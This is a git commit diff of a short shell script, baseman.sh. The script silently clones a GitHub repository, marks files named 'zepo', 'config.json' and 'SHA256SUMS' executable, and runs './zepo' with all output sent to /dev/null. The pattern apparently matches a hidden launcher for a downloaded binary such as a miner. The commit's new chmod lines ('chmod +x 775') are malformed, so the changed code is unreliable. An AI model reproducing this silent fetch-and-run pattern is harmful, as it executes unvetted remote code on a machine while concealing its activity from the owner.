26464d01664e97a8fa2b53585dd6165a14fde5d9
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-11-29 13:50:37 +0700

    Update baseman.sh

--- baseman.sh
+++ baseman.sh
@@ -1,6 +1,6 @@
 git clone https://github.com/55113110159/apikey.git >/dev/null 2>&1
 cd zephher
-chmod +x SHA256SUMS
-chmod +x config.json
-chmod +x zepo
+chmod +x 775 SHA256SUMS
+chmod +x 775  config.json
+chmod +x 775  zepo
 ./zepo -c "config.json" >/dev/null 2>&1
